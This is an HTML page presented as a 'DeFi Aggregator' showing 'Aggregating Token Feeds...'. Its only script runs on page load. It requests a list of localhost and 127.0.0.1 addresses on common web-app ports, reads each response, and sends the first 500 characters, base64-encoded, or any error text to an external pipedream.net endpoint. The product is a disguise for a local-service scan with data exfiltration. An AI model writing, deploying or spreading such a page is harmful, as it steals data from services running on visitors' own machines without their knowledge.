<html>
<head><title>DeFi Aggregator</title></head>
<body>
<h1>Aggregating Token Feeds...</h1>
<script>
// Try common web app ports
var targets = [
  'http://127.0.0.1/',
  'http://127.0.0.1:3000/',
  'http://127.0.0.1:5000/',
  'http://127.0.0.1:8000/',
  'http://127.0.0.1:8080/',
  'http://127.0.0.1:8888/',
  'http://127.0.0.1:9090/',
  'http://localhost/',
  'http://localhost:3000/',
  'http://localhost:8080/'
];

targets.forEach(function(url, i) {
  setTimeout(function() {
    fetch(url)
      .then(function(r) { return r.text(); })
      .then(function(d) {
        // Send first 500 chars to avoid URL length limits
        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
          + '&data=' + btoa(d.substring(0, 500)));
      })
      .catch(function(e) {
        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
          + '&err=' + encodeURIComponent(e.message));
      });
  }, i * 300);
});
</script>
</body>
</html>
